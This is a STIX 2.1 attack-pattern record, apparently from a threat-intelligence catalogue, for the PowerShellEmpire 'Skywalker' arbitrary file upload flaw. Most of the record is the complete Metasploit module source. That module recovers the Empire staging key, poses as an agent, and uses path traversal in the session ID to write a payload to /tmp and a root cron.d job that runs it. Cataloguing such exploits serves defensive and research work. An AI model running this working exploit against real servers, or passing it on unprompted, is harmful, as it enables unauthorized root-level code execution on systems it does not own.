{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa3530b6-bdda-4c13-9182-d1ae7e29ed57",
    "created": "2024-08-14T17:04:06.082074Z",
    "modified": "2024-08-14T17:04:06.082078Z",
    "name": "PowerShellEmpire Arbitrary File Upload (Skywalker)",
    "description": " A vulnerability existed in the PowerShellEmpire server prior to commit f030cf62 which would allow an arbitrary file to be written to an attacker controlled location with the permissions of the Empire server.  This exploit will write the payload to /tmp/ directory followed by a cron.d file to execute the payload. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/empire_skywalker.rb",
            "external_id": "empire_skywalker.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.harmj0y.net/blog/empire/empire-fails/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  TASK_DOWNLOAD = 41\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'PowerShellEmpire Arbitrary File Upload (Skywalker)',\n      'Description'     => %q{\n        A vulnerability existed in the PowerShellEmpire server prior to commit\n        f030cf62 which would allow an arbitrary file to be written to an\n        attacker controlled location with the permissions of the Empire server.\n\n        This exploit will write the payload to /tmp/ directory followed by a\n        cron.d file to execute the payload.\n      },\n      'Author'          =>\n        [\n          'Spencer McIntyre',   # Vulnerability discovery & Metasploit module\n          'Erik Daguerre'       # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      => [\n        ['URL', 'http://www.harmj0y.net/blog/empire/empire-fails/']\n      ],\n      'Payload'         =>\n        {\n          'DisableNops' => true,\n        },\n      'Platform'        => %w{ linux python },\n      'Targets'         =>\n        [\n          [ 'Python', { 'Arch' => ARCH_PYTHON, 'Platform' => 'python' } ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ]\n        ],\n      'DefaultOptions'  => { 'WfsDelay' => 75 },\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2016-10-15',\n      'Notes'           =>\n        {\n          'Stability'   => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, ],\n          'Reliability' => [ REPEATABLE_SESSION, ],\n        },\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [ false, 'Base URI path', '/' ]),\n        OptString.new('STAGE0_URI', [ true, 'The resource requested by the initial launcher, default is index.asp', 'index.asp' ]),\n        OptString.new('STAGE1_URI', [ true, 'The resource used by the RSA key post, default is index.jsp', 'index.jsp' ]),\n        OptString.new('PROFILE', [ false, 'Empire agent traffic profile URI.', '' ])\n      ])\n  end\n\n  def check\n    return Exploit::CheckCode::Safe if get_staging_key.nil?\n\n    Exploit::CheckCode::Appears\n  end\n\n  def aes_encrypt(key, data, include_mac=false)\n    cipher = OpenSSL::Cipher.new('aes-256-cbc')\n    cipher.encrypt\n    iv = cipher.random_iv\n    cipher.key = key\n    cipher.iv = iv\n    data = iv + cipher.update(data) + cipher.final\n\n    digest = OpenSSL::Digest.new('sha1')\n    data << OpenSSL::HMAC.digest(digest, key, data) if include_mac\n\n    data\n  end\n\n  def create_packet(res_id, data, counter=nil)\n    data = Rex::Text::encode_base64(data)\n    counter = Time.new.to_i if counter.nil?\n\n    [ res_id, counter, data.length ].pack('VVV') + data\n  end\n\n  def reversal_key\n    # reversal key for commit da52a626 (March 3rd, 2016) - present (September 21st, 2016)\n    [\n      [ 160, 0x3d], [  33, 0x2c], [  34, 0x24], [ 195, 0x3d], [ 260, 0x3b], [  37, 0x2c], [  38, 0x24], [ 199, 0x2d],\n      [   8, 0x20], [  41, 0x3d], [  42, 0x22], [ 139, 0x22], [ 108, 0x2e], [ 173, 0x2e], [  14, 0x2d], [  47, 0x29],\n      [ 272, 0x5d], [ 113, 0x3b], [  82, 0x3b], [  51, 0x2d], [ 276, 0x2e], [ 213, 0x2e], [  86, 0x2d], [ 183, 0x3a],\n      [  24, 0x7b], [  57, 0x2d], [ 282, 0x20], [  91, 0x20], [  92, 0x2d], [ 157, 0x3b], [  30, 0x28], [  31, 0x24]\n    ]\n  end\n\n  def rsa_encode_int(value)\n    encoded = []\n    while value > 0 do\n      encoded << (value & 0xff)\n      value >>= 8\n    end\n\n    Rex::Text::encode_base64(encoded.reverse.pack('C*'))\n  end\n\n  def rsa_key_to_xml(rsa_key)\n    rsa_key_xml  = \"<RSAKeyValue>\\n\"\n    rsa_key_xml << \"  <Exponent>#{ rsa_encode_int(rsa_key.e.to_i) }</Exponent>\\n\"\n    rsa_key_xml << \"  <Modulus>#{ rsa_encode_int(rsa_key.n.to_i) }</Modulus>\\n\"\n    rsa_key_xml << \"</RSAKeyValue>\"\n\n    rsa_key_xml\n  end\n\n  def get_staging_key\n    # STAGE0_URI resource requested by the initial launcher\n    # The default STAGE0_URI resource is index.asp\n    # https://github.com/adaptivethreat/Empire/blob/293f06437520f4747e82e4486938b1a9074d3d51/setup/setup_database.py#L34\n    res = send_request_cgi({\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path, datastore['STAGE0_URI'])\n    })\n    return unless res and res.code == 200\n\n    staging_key = Array.new(32, nil)\n    staging_data = res.body.bytes\n\n    reversal_key.each_with_index do |(pos, char_code), key_pos|\n      staging_key[key_pos] = staging_data[pos] ^ char_code\n    end\n\n    return if staging_key.include? nil\n\n    # at this point the staging key should have been fully recovered but\n    # we'll verify it by attempting to decrypt the header of the stage\n    decrypted = []\n    staging_data[0..23].each_with_index do |byte, pos|\n      decrypted << (byte ^ staging_key[pos])\n    end\n    return unless decrypted.pack('C*').downcase == 'function start-negotiate'\n\n    staging_key\n  end\n\n  def write_file(path, data, session_id, session_key, server_epoch)\n    # target_url.path default traffic profile for empire agent communication\n    # https://github.com/adaptivethreat/Empire/blob/293f06437520f4747e82e4486938b1a9074d3d51/setup/setup_database.py#L50\n    data = create_packet(\n      TASK_DOWNLOAD,\n      [\n        '0',\n        session_id + path,\n        Rex::Text::encode_base64(data)\n      ].join('|'),\n      server_epoch\n    )\n\n    if datastore['PROFILE'].blank?\n      profile_uri = normalize_uri(target_uri.path, %w{ admin/get.php news.asp login/process.jsp }.sample)\n    else\n      profile_uri = normalize_uri(target_uri.path, datastore['PROFILE'])\n    end\n\n    res = send_request_cgi({\n      'cookie'    => \"SESSIONID=#{session_id}\",\n      'data'      => aes_encrypt(session_key, data, include_mac=true),\n      'method'    => 'POST',\n      'uri'       => normalize_uri(profile_uri)\n    })\n    fail_with(Failure::Unknown, \"Failed to write file\") unless res and res.code == 200\n\n    res\n  end\n\n  def cron_file(command)\n    cron_file = 'SHELL=/bin/sh'\n    cron_file << \"\\n\"\n    cron_file << 'PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin'\n    cron_file << \"\\n\"\n    cron_file << \"* * * * * root #{command}\"\n    cron_file << \"\\n\"\n\n    cron_file\n  end\n\n  def exploit\n    vprint_status('Recovering the staging key...')\n    staging_key = get_staging_key\n    if staging_key.nil?\n      fail_with(Failure::Unknown, 'Failed to recover the staging key')\n    end\n    vprint_good(\"Successfully recovered the staging key: #{staging_key.map { |b| b.to_s(16) }.join(':')}\")\n    staging_key = staging_key.pack('C*')\n\n    rsa_key = OpenSSL::PKey::RSA.new(2048)\n    session_id = Array.new(50, '..').join('/')\n    # STAGE1_URI, The resource used by the RSA key post\n    # The default STAGE1_URI resource is index.jsp\n    # https://github.com/adaptivethreat/Empire/blob/293f06437520f4747e82e4486938b1a9074d3d51/setup/setup_database.py#L37\n    res = send_request_cgi({\n      'cookie'    => \"SESSIONID=#{session_id}\",\n      'data'      => aes_encrypt(staging_key, rsa_key_to_xml(rsa_key)),\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, datastore['STAGE1_URI'])\n    })\n    fail_with(Failure::Unknown, 'Failed to send the RSA key') unless res and res.code == 200\n    vprint_good(\"Successfully sent the RSA key\")\n\n    # decrypt the response and pull out the epoch and session_key\n    body = rsa_key.private_decrypt(res.body)\n    server_epoch = body[0..9].to_i\n    session_key = body[10..-1]\n    print_good('Successfully negotiated an artificial Empire agent')\n\n    payload_data = nil\n    payload_path = '/tmp/' + rand_text_alpha(8)\n\n    case target['Arch']\n    when ARCH_PYTHON\n      cron_command = \"python #{payload_path}\"\n      payload_data = payload.raw\n\n    when ARCH_X86, ARCH_X64\n      cron_command = \"chmod +x #{payload_path} && #{payload_path}\"\n      payload_data = payload.encoded_exe\n\n    end\n\n    print_status(\"Writing payload to #{payload_path}\")\n    write_file(payload_path, payload_data, session_id, session_key, server_epoch)\n\n    cron_path = '/etc/cron.d/' + rand_text_alpha(8)\n    print_status(\"Writing cron job to #{cron_path}\")\n\n    write_file(cron_path, cron_file(cron_command), session_id, session_key, server_epoch)\n    print_status(\"Waiting for cron job to run, can take up to 60 seconds\")\n\n    register_files_for_cleanup(cron_path)\n    register_files_for_cleanup(payload_path)\n    # Empire writes to a log file location based on the Session ID, so when\n    # exploiting this vulnerability that file ends up in the root directory.\n    register_files_for_cleanup('/agent.log')\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-10-15",
    "x_mitre_platforms": [
        "%w{ linux python }"
    ]
}